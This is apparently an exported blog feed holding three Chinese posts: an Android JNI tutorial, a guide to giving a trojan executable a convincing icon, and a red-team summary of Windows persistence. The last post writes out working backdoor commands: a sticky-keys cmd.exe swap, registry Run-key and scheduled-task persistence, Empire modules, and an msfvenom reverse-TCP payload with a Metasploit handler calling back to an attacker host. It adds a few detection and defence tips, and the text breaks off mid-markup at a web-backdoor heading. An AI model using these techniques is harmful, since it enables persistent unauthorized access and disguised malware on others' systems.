src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212237105.png" alt="image-20210812212237105"></p><h3 id="MainActivity-h"><a href="#MainActivity-h" class="headerlink" title="MainActivity.h"></a>MainActivity.h</h3><p>把<code>MainActivity.h</code>更名 拖入<code>jni</code>文件夹</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212436486.png" alt="image-20210812212436486"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212509913.png" alt="image-20210812212509913"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212536201.png" alt="image-20210812212536201"></p><h3 id="一个-c文件两个-mk文件"><a href="#一个-c文件两个-mk文件" class="headerlink" title="一个.c文件两个.mk文件"></a>一个<code>.c</code>文件两个<code>.mk</code>文件</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212736407.png" alt="image-20210812212736407"></p><p><code>.c</code>文件的头文件进行调用<code>.h</code>文件</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212900421.png" alt="image-20210812212900421"></p><h3 id="写函数"><a href="#写函数" class="headerlink" title="写函数"></a>写函数</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812213322630.png" alt="image-20210812213322630"></p><p>返回值 参数 方法体 三个类型</p><p>只有两个参数</p><p>补充参数</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812213555345.png" alt="image-20210812213555345"></p><p>回显内容：return</p><p>目的：c层返回一个字符串给java层</p><p>借助JNI接口<code>NewStringUTF</code></p><p>查万能表</p><pre class="line-numbers language-none"><code class="language-none">jstring     (*NewStringUTF)(JNIEnv*, const char*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回的是一个字符串 使用str接收</p><p>使用JNI指针类型指出</p><pre class="line-numbers language-none"><code class="language-none">jstring str = *aaa-&gt;NewStringUTF(JNIEnv*, const char*);return bbb;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>需要使用的话还需要定义一个参数，不然 return的返回值 bbb无法从C层回到java层</p><p>bbb是个字符串，那么可以使用str，接受后使用<code>JNI(day)指针类型</code>指出</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812214033628.png" alt="image-20210812214033628"></p><p>然后使用<code>JNIEnv</code>类型去定义参数，再放入返回值</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815191518672.png" alt="image-20210815191518672"></p><p>然后再把我们涉及到的两个<code>.mk</code>文件搞过来</p><p>Android.mk</p><pre class="line-numbers language-Android.mk" data-language="Android.mk"><code class="language-Android.mk">LOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := JNI_Aaa #模块名称LOCAL_SRC_FILES := JNI_Aaa.c #源文件LOCAL_ARM_MODE := arm #编译后的指令集armLOCAL_LDLIBS += -llog #依赖库include $(BUILD_SHARED_LIBRARY) #指定的编译文件类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：我们之前要编译的是EXE文件类型 所以使用的是：<code>include $(BUILD_HARED_LIBRARY)</code></p><p>今天编译的是so库，所以使用的是：<code>include $(BUILD_SHARED_LIBRARY)</code></p><p>Application.mk</p><pre class="line-numbers language-none"><code class="language-none">APP_ABI := x86 armeabi-v7a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815160334982.png" alt="image-20210815160334982"></p><h3 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815160707180.png" alt="image-20210815160707180"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815160645969.png" alt="image-20210815160645969"></p><p>修改为UTF-8即可</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815160752476.png" alt="image-20210815160752476"></p><p>全部保存后进行编译</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>去jni包所在的目录</p><p>进行编译</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815191635145.png" alt="image-20210815191635145"></p><p>Eclipse进行刷新(F5)</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815174729793.png" alt="image-20210815174729793"></p><p><code>so库</code>文件在obj目录下</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815191711492.png" alt="image-20210815191711492"></p><p>我们的返回值<code>bbb</code>在obj的目录下</p><p>那么回到java层 把返回值 带回来即可</p><pre class="line-numbers language-none"><code class="language-none">static{ System.loadLibrary("JNI_Aaa");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815192927593.png" alt="image-20210815192927593"></p><p>然后编译输出</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815193008141.png" alt="image-20210815193008141"></p><h2 id="静态注册-二"><a href="#静态注册-二" class="headerlink" title="静态注册(二)"></a>静态注册(二)</h2><p>继续</p><h3 id="定义俩个字段"><a href="#定义俩个字段" class="headerlink" title="定义俩个字段"></a>定义俩个字段</h3><p>在主类中写入</p><pre class="line-numbers language-none"><code class="language-none">public String aa1 = "我是aa1";public static String aa2 = "我是静态aa2";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815200221139.png" alt="image-20210815200221139"></p><p>第一个是普通字段 第二个是静态字段</p><h3 id="定义两个方法"><a href="#定义两个方法" class="headerlink" title="定义两个方法"></a>定义两个方法</h3><pre class="line-numbers language-none"><code class="language-none">public native CharSequence Getaa1();public native CharSequence Getaa2();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815200444694.png" alt="image-20210815200444694"></p><h3 id="Toast来调用写入的字段"><a href="#Toast来调用写入的字段" class="headerlink" title="Toast来调用写入的字段"></a>Toast来调用写入的字段</h3><pre class="line-numbers language-none"><code class="language-none">Toast.makeText(this,Getaa1(),Toast.LENGTH_SHORT).show();Toast.makeText(this,Getaa2(),Toast.LENGTH_SHORT).show();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815200626794.png" alt="image-20210815200626794"></p><h3 id="生成-h文件"><a href="#生成-h文件" class="headerlink" title="生成.h文件"></a>生成<code>.h</code>文件</h3><p>获取src目录</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815201401074.png" alt="image-20210815201401074"></p><pre class="line-numbers language-none"><code class="language-none">D:\data\aaa\src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取完整路径</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815201452994.png" alt="image-20210815201452994"></p><pre class="line-numbers language-none"><code class="language-none">com.example.aaa.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成</p><pre class="line-numbers language-none"><code class="language-none">javah -encoding UTF-8 -jni com.example.aaa.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815201621218.png" alt="image-20210815201621218"></p><p>编码问题</p><p>加上<code>-encoding UTF-8</code>即可</p><p>F5刷新</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815201729174.png" alt="image-20210815201729174"></p><p>改名 丢到jni目录下</p><p>把之前的删除了。。</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815201847134.png" alt="image-20210815201847134"></p><p>改名</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815201923978.png" alt="image-20210815201923978"></p><h3 id="修改-c文件-gt-普通字段"><a href="#修改-c文件-gt-普通字段" class="headerlink" title="修改.c文件->普通字段"></a>修改.c文件-&gt;普通字段</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816115732747.png" alt="image-20210816115732747"></p><p>构建参数：<code>ccc</code>，然后写方法体内容</p><p>获取普通字段方法需要用到JNI接口中的：<code>Getobjectfield</code></p><h3 id="查万能表"><a href="#查万能表" class="headerlink" title="查万能表"></a>查万能表</h3><pre class="line-numbers language-none"><code class="language-none">jobject (*GetObjectField)(JNIEnv*, jobject, jfieldID);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行定义变量 接收获取到的字符串</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816115830318.png" alt="image-20210816115830318"></p><p>参数<code>jfieldID</code>获取要用到方法：<code>GetFieldID</code></p><h3 id="查万能表-1"><a href="#查万能表-1" class="headerlink" title="查万能表"></a>查万能表</h3><pre class="line-numbers language-none"><code class="language-none">jfieldID (*GetFieldID)(JNIEnv*, jclass, const char*, const char*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三个参数就是字段变量名，去java层找的变量</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815203326051.png" alt="image-20210815203326051"></p><p>这里就是：aa1</p><p>第四个参数是返回值类型，因为第三个参数是 string类型定义的</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815203259731.png" alt="image-20210815203259731"></p><pre class="line-numbers language-none"><code class="language-none">java.lang.String<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么在C里面写法是不一样的：应该加上L：开头是Smali代码写法</p><pre class="line-numbers language-none"><code class="language-none">"Ljava/lang/String"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816115945138.png" alt="image-20210816115945138"></p><p>然后看第二个参数：jclass</p><p>需要JNI中的Findclass进行返回</p><h3 id="查万能表-2"><a href="#查万能表-2" class="headerlink" title="查万能表"></a>查万能表</h3><pre class="line-numbers language-none"><code class="language-none">jclass (*FindClass)(JNIEnv*, const char*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用变量：ccc指出</p><p>第二个参数：<code>const char*</code>是类的路径</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210815204114116.png" alt="image-20210815204114116"></p><pre class="line-numbers language-none"><code class="language-none">com.example.aaa.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>继续变换为C语言的写法 把<code>.</code>换成<code>/</code></p><pre class="line-numbers language-none"><code class="language-none">"com/example/dayuanquan/MainActivity"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816120042455.png" alt="image-20210816120042455"></p><h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816120119718.png" alt="image-20210816120119718"></p><p>完整代码如下</p><pre class="line-numbers language-none"><code class="language-none">JNIEXPORT jobject JNICALL Java_com_example_aaa_MainActivity_Getaa1  (JNIEnv *ccc, jobject obj){jclass jclass=(*ccc)-&gt;FindClass(ccc, "com/example/dayuanquan/MainActivity");jfieldID jfieldID=(*ccc)-&gt;GetFieldID(ccc, jclass, "aa1", "Ljava/lang/String;");jobject str1=(*ccc)-&gt;GetObjectField(ccc, obj, jfieldID);return str1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-C文件-gt-静态字段"><a href="#修改-C文件-gt-静态字段" class="headerlink" title="修改.C文件->静态字段"></a>修改<code>.C</code>文件-&gt;静态字段</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816120347923.png" alt="image-20210816120347923"></p><h3 id="查万能表-3"><a href="#查万能表-3" class="headerlink" title="查万能表"></a>查万能表</h3><p>获取静态字段要用：<code>GetStaticObjectField</code></p><p>查万能表可知：</p><pre class="line-numbers language-none"><code class="language-none">jobject (*GetStaticObjectField)(JNIEnv*, jclass, jfieldID);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816120813683.png" alt="image-20210816120813683"></p><h3 id="查万能表-4"><a href="#查万能表-4" class="headerlink" title="查万能表"></a>查万能表</h3><p>参数<code>jfieldID2</code>获取要用到方法：<code>GetFieldID</code></p><pre class="line-numbers language-none"><code class="language-none">jfieldID (*GetStaticFieldID)(JNIEnv*, jclass, const char*,const char*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816121149517.png" alt="image-20210816121149517"></p><h3 id="查万能表-5"><a href="#查万能表-5" class="headerlink" title="查万能表"></a>查万能表</h3><pre class="line-numbers language-none"><code class="language-none">jclass (*FindClass)(JNIEnv*, const char*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用变量：ccc指出</p><p>第二个参数：<code>const char*</code>是类的路径</p><p>和普通字段一样 改一下参数即可</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816121322887.png" alt="image-20210816121322887"></p><h3 id="return-1"><a href="#return-1" class="headerlink" title="return"></a>return</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816121416623.png" alt="image-20210816121416623"></p><h3 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816121543738.png" alt="image-20210816121543738"></p><p>注：没有小告警的生成是因为</p><p>在<code>Application.mk</code>中定义Android的版本即可</p><pre class="line-numbers language-none"><code class="language-none">APP_PLATFORM := android-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816121612815.png" alt="image-20210816121612815"></p><p>F5刷新项目</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816121815890.png" alt="image-20210816121815890"></p><p>最后 记得在Java层写下 引导</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210816121844579.png" alt="image-20210816121844579"></p><p>OK 就到这里</p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(六) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>木马添加图标</title>
      <link href="/2021/10/28/mu-ma-tian-jia-tu-biao/"/>
      <url>/2021/10/28/mu-ma-tian-jia-tu-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows 下使用一些资源编译工具来给 exe 添加图标，但是不是很顺利</p><p>特意记录一下</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>使用<code>BeCyIconGrabber.exe</code>快速提取ico图标</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303971.png" alt="image-20211117153332860"></p><p>注：像素大小自己选择</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303291.png" alt="image-20211117154615562"></p><p>使用<code>Restorator 2018</code>为exe 添加图标：</p><p>将exe拖到左边来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303525.png" alt="image-20211117153727288"></p><p>菜单栏添加资源</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303757.png" alt="image-20211117153811748"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303339.png" alt="image-20211117153827031"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303948.png" alt="image-20211117153914486"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303950.png" alt="image-20211117154010756"></p><p>将ico图标拖入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303150.png" alt="image-20211117154107379"></p><p>最后将文件另存为即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261303207.png" alt="image-20211117154212519"></p><p>看看效果</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261304826.png" alt="image-20211117154228851"></p><p>注：这里是一个32×32的图标</p><p>可以 自己调整效果</p>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木马添加图标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限维持小结</title>
      <link href="/2021/10/28/quan-xian-wei-chi/"/>
      <url>/2021/10/28/quan-xian-wei-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以权限维持就显得很重要了。</p><h2 id="权限维持重要性"><a href="#权限维持重要性" class="headerlink" title="权限维持重要性"></a>权限维持重要性</h2><pre class="line-numbers language-none"><code class="language-none">1.渗透测试利用相关漏洞拿下目标站点2.持续输出可以持久输出数据3.获取信息利用webshell获取到需要的信息4.权限维持对目标进行权限维持<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h1><h2 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h2><h3 id="手上"><a href="#手上" class="headerlink" title="手上"></a>手上</h3><p>安全模式下</p><ul><li>工作组的命令框</li></ul><p>复制粘贴cmd.exe 然后就直接打开了</p><ul><li> 域用户的命令框</li></ul><p>把cmd复制一份改成粘滞键的名字</p><p>进入到登录页面 就可以创建域用户</p><p>进入系统</p><p>用可执行文件<code>sethc.exe.bak</code>替换<code>windows\systdm32</code>目录下的sethc.exe </p><pre class="line-numbers language-none"><code class="language-none">cd windows\system32move sethc.exe sethc.exe.bakcopy cmd.exe sethc.exe #连续按5次shift键,将弹出命令行窗口。可以直接以system权限执行系统命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>前提得是*用户，过UAC,system权限才行</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">usemodule lateral_movement<span class="token operator">/</span>invoke_wmi_debuggerinfo<span class="token keyword">set</span> Listener dayu<span class="token keyword">set</span> <span class="token return-type class-name">ComputerName</span> user1<span class="token punctuation">.</span>xiyou<span class="token punctuation">.</span>dayu<span class="token punctuation">.</span>com <span class="token punctuation">(</span>计算机名<span class="token punctuation">)</span><span class="token keyword">set</span> TargetBinary sethc<span class="token punctuation">.</span>exeexecute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行完execute被攻击方电脑会一闪而过CMD终端窗口!<br>最后，在目标系统上连续按5次shift键触发后门:</p><h3 id="粘滞键后门防范措施"><a href="#粘滞键后门防范措施" class="headerlink" title="粘滞键后门防范措施"></a>粘滞键后门防范措施</h3><p>1.在远程登录服务器时，连续按5次“”Shift”键，判断服务器是否被人侵。<br>2.拒绝使用setch.exe或者在“控制面板”中关闭“启用粘滞键”选项</p><h2 id="注册表后门"><a href="#注册表后门" class="headerlink" title="注册表后门"></a>注册表后门</h2><h3 id="手上-1"><a href="#手上-1" class="headerlink" title="手上"></a>手上</h3><p>在普通用户权限下,攻击者会将需要执行的后门程序或者脚本路径填写到注册表键</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Run:该项下的键值即为开机启动项,每-次随着开机而启动</p><p>运行输入：regedit.exe</p><h3 id="Empire-1"><a href="#Empire-1" class="headerlink" title="Empire"></a>Empire</h3><p>输入<code>usemodule persistence/userland/registry</code>命令模块 </p><p>运行后，会在目标主机的启动项里增加一个命令</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">usemodule persistence<span class="token operator">/</span>userland<span class="token operator">/</span>registry<span class="token keyword">set</span> Listener dayu<span class="token keyword">set</span> <span class="token class-name">RegPath</span> HKCU<span class="token punctuation">:</span>Software\Microsoft\Windows\CurrentVersion\Runexecute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当管理员登陆系统时，后门就会运行，反弹成功!</p><p>注销或者重启后，后门就自动运行了</p><p>进入桌面自动闪过cmd命令框</p><p>kali就上线了！</p><h3 id="注册表后门防范措施"><a href="#注册表后门防范措施" class="headerlink" title="注册表后门防范措施"></a>注册表后门防范措施</h3><p>杀毒软件针对此类后门有专门的查杀机制，当发现系统中存在后门时会弹出提示框。根据提示内容， 采取相应的措施，即可删除此类后门</p><h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><h3 id="手上-2"><a href="#手上-2" class="headerlink" title="手上"></a>手上</h3><p>计划任务在Windows7及之前版本的操作系统中使用at命令调用，在从Windows8版本开始的操作系 统中使用<code>schtasks</code>命令调用。</p><p>计划任务后门分为<code>管理员权限</code>和<code>普通用户权限</code>两种。管理员权限的后门 可以设置更多的计划任务，例如重启后运行等。<br>计划任务后门的基本命令如下。该命令表示每小时执行一次notepad.exe</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">schtasks <span class="token operator">/</span>Create <span class="token operator">/</span>tn Updater <span class="token operator">/</span>tr notepad<span class="token punctuation">.</span>exe <span class="token operator">/</span>sc MINUTE <span class="token operator">/</span>mo <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282131116.png" alt="在这里插入图片描述"></p><p>删除话 这个命令就可以</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">schtasks <span class="token operator">/</span>Delete <span class="token operator">/</span>tn Updater<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用Poweshell payload web delivery模块，可以模拟攻击者在目标系统中快速建立会话的行为。因 为该行为不会被写入磁盘，所以安全防护软件不会对该行为进行检测</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>script<span class="token operator">/</span>web_delivery <span class="token keyword">set</span> target <span class="token number">2</span><span class="token keyword">set</span> payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token keyword">set</span> lhost <span class="token number">192.168</span><span class="token number">.253</span><span class="token number">.9</span><span class="token keyword">set</span> lport <span class="token number">443</span><span class="token keyword">set</span> URIPATH <span class="token operator">/</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Empire-2"><a href="#Empire-2" class="headerlink" title="Empire"></a>Empire</h3><p>设置DailyTime和Listener参数，到了设置的时间，将执行sec计划，将返回一个高权限的shell：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">usemodule persistence<span class="token operator">/</span>elevated<span class="token operator">/</span>schtasks<span class="token keyword">set</span> DailyTime <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">36</span><span class="token keyword">set</span> Listener dayuexecute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="计划任务后门防范措施"><a href="#计划任务后门防范措施" class="headerlink" title="计划任务后门防范措施"></a>计划任务后门防范措施</h3><p>有效的防范措施是:</p><ul><li>安装安全防护软件并对系统进行扫描 </li><li>及时为系统打补丁</li><li>在内网中使用强度较高的密码</li></ul><h2 id="MSF后门"><a href="#MSF后门" class="headerlink" title="MSF后门"></a>MSF后门</h2><ul><li>生成exe的马儿</li></ul><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span><span class="token class-name">reverse_tcp</span> LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.253</span><span class="token number">.9</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f exe<span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>开启监听</li></ul><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">msfconsole <span class="token operator">-</span>x <span class="token string">"use exploit/multi/handler; set payload windows/meterpreter/reverse_ tcp; set lhost 192.168.253.27; set lport 4444; exploit -j;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>执行后门上线</li><li>查看帮助</li></ul><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">run persistence <span class="token operator">-</span>h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282131118.png" alt="在这里插入图片描述"></p><ul><li>创建服务</li></ul><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">run persistence <span class="token operator">-</span>S <span class="token operator">-</span>U <span class="token operator">-</span>X <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>p <span class="token number">443</span> <span class="token operator">-</span>r IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里要注意的是</p><p>使用了-S 这个参数</p><p>需要（system）权限才能执行创建</p><p>不管关机 重启后都可以上线</p><h2 id="wmi型后门"><a href="#wmi型后门" class="headerlink" title="wmi型后门"></a>wmi型后门</h2><p>在 Empire 下使用Invoke-WMI 模块:</p><p>先进行搜索</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">searchmodule wmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是有多个模块的</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">usemodule persistence<span class="token operator">/</span>elevated<span class="token operator">/</span>wmiinfo<span class="token keyword">set</span> DailyTime <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token keyword">set</span> Listener dayurun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="检测后门"><a href="#检测后门" class="headerlink" title="检测后门"></a>检测后门</h2><p>在powershell下</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">Get<span class="token operator">-</span>WmiObject <span class="token operator">-</span>Namespace root\Subscription <span class="token operator">-</span>Class CommandLineEventConsumer <span class="token operator">-</span>FILTER <span class="token string">"Name='Updater'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282131119.png" alt="在这里插入图片描述"><br>这样就是没有的</p><h2 id="清除WMI后门得到方法"><a href="#清除WMI后门得到方法" class="headerlink" title="清除WMI后门得到方法"></a>清除WMI后门得到方法</h2><p>删除自动运行列表中的恶意WMI条目<br>在powershell中用<code>get-wmiobject</code>命令删除与WMI持久化的组件</p><h1 id="web后门"><a href="#web后门" class="headerlink" title="web后门"></a>web后门</h1><h2 id="weevely后门"><a href="#weevely后门" class="headerlink" 